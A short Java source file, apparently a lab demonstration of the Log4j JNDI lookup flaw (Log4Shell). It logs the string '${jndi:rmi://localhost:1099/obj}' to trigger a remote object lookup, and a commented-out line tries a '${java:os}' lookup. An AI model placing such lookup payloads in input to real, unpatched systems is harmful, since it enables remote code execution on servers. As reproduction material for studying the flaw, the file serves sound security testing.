package run.ergou.jndi.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jJNDI {
    public static final Logger logger = LogManager.getLogger(Log4jJNDI.class);

    public static void main(String[] args) {
        logger.error("${jndi:rmi://localhost:1099/obj}");
//        logger.error("${java:os}");
    }
}
